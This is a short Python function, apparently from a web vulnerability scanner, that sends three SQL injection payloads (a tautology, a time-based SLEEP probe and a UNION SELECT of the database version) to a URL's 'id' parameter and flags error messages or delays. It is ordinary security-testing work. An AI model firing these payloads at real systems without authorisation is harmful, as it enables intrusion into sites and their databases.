async def check_sqli(session, url, logger, fetch):
    payloads = [
        "' OR 1=1 --",  # Error-based
        "1' AND SLEEP(2) --",  # Blind time-based
        "' UNION SELECT NULL,@@version --",  # Union-based
    ]
    for payload in payloads:
        start = asyncio.get_event_loop().time()
        response, status = await fetch(session, url, params={"id": payload})
        elapsed = asyncio.get_event_loop().time() - start
        if response and ("sql" in response.lower() or "mysql" in response.lower()):
            logger.info(f"SQLi (error-based) at {url}")
            return {"type": "SQLi", "url": url, "poc": payload, "depth": "deep"}
        elif elapsed > 1.5 and "SLEEP" in payload:  # Blind check
            logger.info(f"SQLi (blind) at {url}")
            return {"type": "SQLi", "url": url, "poc": payload, "depth": "deep"}
    return None
